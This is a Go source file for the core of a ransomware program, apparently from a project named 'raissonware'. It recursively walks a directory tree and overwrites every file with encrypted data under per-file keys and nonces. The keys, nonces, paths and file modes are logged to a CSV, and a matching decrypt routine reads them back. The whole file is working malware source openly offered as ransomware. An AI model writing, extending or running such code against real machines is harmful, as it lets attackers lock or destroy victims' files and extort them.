package ransomware

import (
	"log"
	"os"
	"path/filepath"
	"raissonware/pkg/cryptography"
	"raissonware/pkg/csv"
	"sync"
)

// FindFiles recursively search for files and executes the EncryptFile function
func FindFiles(csvPath string, path string, wg *sync.WaitGroup) {
	defer wg.Done()
	wg.Add(1)

	files, err := os.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		subPath := filepath.Join(path, file.Name())

		if file.IsDir() {
			go FindFiles(csvPath, subPath, wg)
			continue
		}

		EncryptFile(csvPath, subPath, wg)
	}
}

// EncryptFile replace the data in the file for it encrypted data.
// Also, writes in the CSV the useful data to decrypt the data later.
func EncryptFile(csvPath string, path string, wg *sync.WaitGroup) {
	defer wg.Done()
	wg.Add(1)

	fileInfo, err := os.Stat(path)
	if err != nil {
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	secretKey, err := cryptography.GenSecretKey()
	if err != nil {
		log.Fatal(err)
	}

	nonce, err := cryptography.GenNonce()
	if err != nil {
		log.Fatal(err)
	}

	encryptedData, err := cryptography.Encrypt(data, secretKey, nonce)
	if err != nil {
		log.Fatal(err)
	}

	err = os.WriteFile(path, encryptedData, fileInfo.Mode())
	if err != nil {
		log.Fatal(err)
	}

	csvRow := RansomRow{
		Path:      path,
		SecretKey: secretKey,
		Nonce:     nonce,
		FileMode:  fileInfo.Mode(),
	}

	err = csv.AppendLine(csvPath, csvRow.RansomRowToArrayOfString())
	if err != nil {
		log.Fatal(err)
	}
}

// DecryptFile uses the ransomRow data to decrypt the content of a file.
func DecryptFile(ransomRow RansomRow, wg *sync.WaitGroup) {
	defer wg.Done()
	wg.Add(1)

	encryptedData, err := os.ReadFile(ransomRow.Path)
	if err != nil {
		log.Fatal(err)
	}

	data, err := cryptography.Decrypt(encryptedData, ransomRow.SecretKey, ransomRow.Nonce)
	if err != nil {
		log.Fatal(err)
	}

	err = os.WriteFile(ransomRow.Path, data, ransomRow.FileMode)
	if err != nil {
		log.Fatal(err)
	}
}
